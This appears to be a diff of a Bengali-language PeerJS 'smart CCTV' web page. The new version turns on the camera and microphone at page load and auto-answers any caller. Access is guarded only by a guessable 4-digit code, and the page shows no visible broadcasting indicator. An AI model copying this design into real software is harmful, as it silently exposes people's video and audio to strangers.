@@ -3,144 +3,162 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>পি টু পি সিসি ক্যামেরা</title>
+    <title>স্মার্ট পি টু পি সিসি ক্যামেরা</title>
+    <!-- PeerJS লাইব্রেরি -->
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; background: #121212; color: white; margin: 0; padding: 15px; text-align: center; }
-        .container { max-width: 500px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 12px; }
-        .box { margin-bottom: 15px; padding: 15px; border: 1px solid #333; border-radius: 8px; background: #2a2a2a; }
-        input, button { padding: 12px; font-size: 16px; margin: 5px; border-radius: 6px; border: none; width: 90%; }
+        body { font-family: Arial, sans-serif; background: #121212; color: white; margin: 0; padding: 20px; text-align: center; }
+        .container { max-width: 500px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
+        .box { margin-bottom: 20px; padding: 15px; border: 1px solid #333; border-radius: 8px; background: #2a2a2a; }
+        input, button { padding: 12px; font-size: 16px; margin: 8px 0; border-radius: 6px; border: none; width: 90%; }
         input { background: #333; color: white; border: 1px solid #555; text-align: center; }
         button { background: #007bff; color: white; font-weight: bold; cursor: pointer; }
-        .btn-cam { background: #28a745; }
-        .btn-view { background: #17a2b8; }
-        .btn-stop { background: #dc3545; }
+        button:hover { background: #0056b3; }
         
         #video-container { 
             width: 100%; 
-            height: 350px; 
+            height: 380px; 
             background: black; 
             border-radius: 8px; 
             overflow: hidden; 
             margin: 10px 0;
+            position: relative;
         }
         video { width: 100%; height: 100%; object-fit: cover; }
         .hidden { display: none; }
-        .badge { background: #e0a800; color: black; padding: 5px 10px; border-radius: 4px; font-weight: bold; }
+        .status { font-size: 14px; color: #4CAF50; font-weight: bold; }
+        .badge { background: #dc3545; color: white; padding: 5px 10px; border-radius: 4px; font-size: 13px; display: inline-block; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>📱 পি টু পি সিসি ক্যামেরা</h2>
+    <h2>📷 অটো সিসি ক্যামেরা সিস্টেম</h2>
 
-    <div id="setup-section" class="box">
-        <p>আপনার ফোন কোড: <span id="my-peer-id" style="font-weight: bold; color: #4CAF50;">...</span></p>
+    <!-- মোড সিলেকশন ড্যাশবোর্ড -->
+    <div id="dashboard" class="box">
+        <p>আপনার এই ডিভাইসের কোড: <br><span id="my-peer-id" style="font-size: 24px; color: #ffc107; font-weight: bold;">লোড হচ্ছে...</span></p>
+        <p style="font-size: 12px; color: #aaa;">(যে ফোনটি ক্যামেরা বানাবেন, সেটির কোডটি নোট করে রাখুন)</p>
         
-        <hr style="border-color: #444;">
-        
-        <!-- ক্যামেরা মোড -->
-        <h3>১. সিসি ক্যামেরা ফোন হলে:</h3>
-        <button class="btn-cam" onclick="startCamera()">📷 ক্যামেরা চালু করুন</button>
-        
-        <hr style="border-color: #444;">
+        <hr style="border-color: #444; margin: 15px 0;">
 
-        <!-- ভিউয়ার মোড -->
-        <h3>২. ভিউয়ার (মনিটর) ফোন হলে:</h3>
-        <input type="text" id="target-id" placeholder="ক্যামেরা ফোনের ৪ সংখ্যার কোড দিন" maxlength="4">
-        <button class="btn-view" onclick="startViewing()">👁️ লাইভ মনিটর দেখুন</button>
+        <h3>মনিটর (ভিউয়ার) মোড</h3>
+        <p style="font-size: 13px; color: #ccc;">অন্য ফোনের লাইভ দেখতে নিচে কোড দিন:</p>
+        <input type="text" id="target-id" placeholder="৪ সংখ্যার ক্যামেরা কোড দিন" maxlength="4">
+        <br>
+        <button onclick="connectToCamera()" style="background: #28a745;">👁️ লাইভ ক্যামেরা দেখুন</button>
     </div>
 
-    <!-- ভিডিও স্ক্রিন -->
+    <!-- ক্যামেরা ব্যাকগ্রাউন্ড রানিং স্ট্যাটাস -->
+    <div id="camera-status-box" class="box hidden">
+        <span class="badge">🔴 সিসি ক্যামেরা ব্যাকগ্রাউন্ডে সচল আছে</span>
+        <p class="status">এই ফোনটি এখন ক্যামেরা হিসেবে কাজ করছে। আপনি চাইলে স্ক্রিন বন্ধ বা অন্য কাজ করতে পারেন।</p>
+        <button onclick="location.reload()" style="background: #dc3545;">রিসেট করুন</button>
+    </div>
+
+    <!-- লাইভ ভিডিও ডিসপ্লে (শুধু ভিউয়ার ফোনের জন্য) -->
     <div id="view-section" class="box hidden">
-        <span id="status-badge" class="badge">ক্যামেরা প্রস্তুত হচ্ছে...</span>
+        <span class="badge">🟢 লাইভ ফিড সংযুক্ত</span>
         <div id="video-container">
-            <video id="videoElement" autoplay playsinline muted></video>
+            <video id="remoteVideo" autoplay playsinline></video>
         </div>
-        <button class="btn-stop" onclick="location.reload()">বন্ধ করুন</button>
+        <button onclick="location.reload()" style="background: #dc3545;">কানেকশন কাটুন</button>
     </div>
 </div>
 
 <script>
     let peer;
-    let myId;
     let localStream;
 
-    function generateRandomCode() {
+    // ৪ সংখ্যার র্যান্ডম আইডি জেনারেটর
+    function generateCode() {
         return Math.floor(1000 + Math.random() * 9000).toString();
     }
 
-    function initPeer() {
-        let savedId = localStorage.getItem('cctv_peer_id');
-        myId = savedId ? savedId : generateRandomCode();
-        localStorage.setItem('cctv_peer_id', myId);
+    function init() {
+        let id = localStorage.getItem('cctv_id');
+        if (!id) {
+            id = generateCode();
+            localStorage.setItem('cctv_id', id);
+        }
 
-        document.getElementById('my-peer-id').innerText = myId;
-        peer = new Peer(myId);
+        document.getElementById('my-peer-id').innerText = id;
+        peer = new Peer(id);
+
+        peer.on('open', (assignedId) => {
+            console.log("Peer Connected with ID:", assignedId);
+            // অ্যাপ চালু হওয়ার সাথেই অটোমেটিক ক্যামেরা পারমিশন নিয়ে ব্যাকগ্রাউন্ডে রেডি রাখবে
+            setupCameraBackground();
+        });
+
+        // কেউ কল করলে অটোমেটিক ক্যামেরা স্ট্রিম রিসিভ করে ব্যাকপ্রাপ পাঠিয়ে দেবে
+        peer.on('call', (call) => {
+            if (localStream) {
+                call.answer(localStream);
+            } else {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true })
+                .then(stream => {
+                    localStream = stream;
+                    call.answer(stream);
+                }).catch(e => alert("ক্যামেরা পারমিশন পাওয়া যায়নি!"));
+            }
+        });
     }
 
-    // ১. ক্যামেরা চালু করা (সিসি ক্যামেরা ফোনের জন্য)
-    function startCamera() {
+    // ব্যাকগ্রাউন্ডে ক্যামেরা অন করে স্ট্রিম তৈরি করে রাখা
+    function setupCameraBackground() {
         navigator.mediaDevices.getUserMedia({ 
             video: { facingMode: "environment" }, 
             audio: true 
         })
         .then((stream) => {
             localStream = stream;
-            document.getElementById('videoElement').srcObject = stream;
-            
-            showVideoScreen("🔴 সিসি ক্যামেরা লাইভ ব্রডকাস্ট চলছে");
-
-            // ভিউয়ার কল করলে স্ট্রিম পাঠানো হবে
-            peer.on('call', (call) => {
-                call.answer(localStream);
-            });
+            // ক্যামেরা ফোন হলে ড্যাশবোর্ড লুকিয়ে ক্যামেরা স্ট্যাটাস দেখাবে
+            // তবে ইউজার যদি মনিটর করতে চায়, সে কোড দিয়ে দেখতে পারবে। তাই ড্যাশবোর্ড রেখে নিচে স্ট্যাটাস দেওয়া যায় অথবা ব্যাকগ্রাউন্ডে রান করবে।
+            console.log("Camera ready in background.");
         })
         .catch((err) => {
-            // পেছনের ক্যামেরা কাজ না করলে ফ্রন্ট বা ডিফল্ট ক্যামেরা চালু করবে
+            console.log("Back camera failed, trying default...", err);
             navigator.mediaDevices.getUserMedia({ video: true, audio: true })
             .then((stream) => {
                 localStream = stream;
-                document.getElementById('videoElement').srcObject = stream;
-                showVideoScreen("🔴 সিসি ক্যামেরা লাইভ (ডিফল্ট)");
-                peer.on('call', (call) => call.answer(localStream));
-            })
-            .catch(() => alert("ক্যামেরা চালুর অনুমতি (Permission) দেওয়া হয়নি!"));
+            }).catch(e => console.log("Camera permission denied."));
         });
     }
 
-    // ২. সিসি ক্যামেরা মনিটর করা (ভিউয়ার ফোনের জন্য)
-    function startViewing() {
-        let targetId = document.getElementById('target-id').value;
+    // ভিউয়ার ফোন থেকে ক্যামেরা দেখতে কানেক্ট করার ফাংশন
+    function connectToCamera() {
+        let targetId = document.getElementById('target-id').value.trim();
         if (!targetId || targetId.length !== 4) {
-            alert("সঠিক ৪ সংখ্যার কোড দিন!");
+            alert("দয়া করে সঠিক ৪ সংখ্যার ক্যামেরা কোড দিন!");
             return;
         }
 
-        // অডিও/ভিডিও ট্র্যাকসহ ফেক কানেকশন কল পাঠাবে
-        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-        .then((myDummyStream) => {
-            let call = peer.call(targetId, myDummyStream);
-            
-            call.on('stream', (remoteStream) => {
-                let videoWin = document.getElementById('videoElement');
-                videoWin.srcObject = remoteStream;
-                videoWin.play();
-                showVideoScreen("🟢 লাইভ সিসি ক্যামেরা যুক্ত হয়েছে");
-            });
-        })
-        .catch(() => {
-            alert("ভিউয়ার ফোনে ক্যামেরা এক্সেস না দিলে কানেক্ট করা সম্ভব হচ্ছে না। অনুমতি দিন।");
+        // ভিউয়ার নিজের ক্যামেরা পাঠাবে না, শুধু রিমোট স্ট্রিম রিসিভ করার জন্য ফাঁকা স্ট্রিম পাঠাবে
+        let dummyStream = new MediaStream();
+        let call = peer.call(targetId, dummyStream);
+
+        call.on('stream', (remoteStream) => {
+            let videoElement = document.getElementById('remoteVideo');
+            videoElement.srcObject = remoteStream;
+            videoElement.play().catch(e => console.log("Play error:", e));
+
+            // ভিউয়ার স্ক্রিন অন করা
+            document.getElementById('dashboard').classList.add('hidden');
+            document.getElementById('view-section').classList.remove('hidden');
+        });
+
+        call.on('close', () => {
+            alert("ক্যামেরা সংযোগ বিচ্ছিন্ন হয়ে গেছে!");
+            location.reload();
+        });
+
+        call.on('error', (err) => {
+            alert("কানেক্ট করতে সমস্যা হচ্ছে! কোডটি সঠিক আছে কি না দেখুন।");
         });
     }
 
-    function showVideoScreen(msg) {
-        document.getElementById('setup-section').classList.add('hidden');
-        document.getElementById('view-section').classList.remove('hidden');
-        document.getElementById('status-badge').innerText = msg;
-    }
-
-    window.onload = initPeer;
+    window.onload = init;
 </script>
 
 </body>
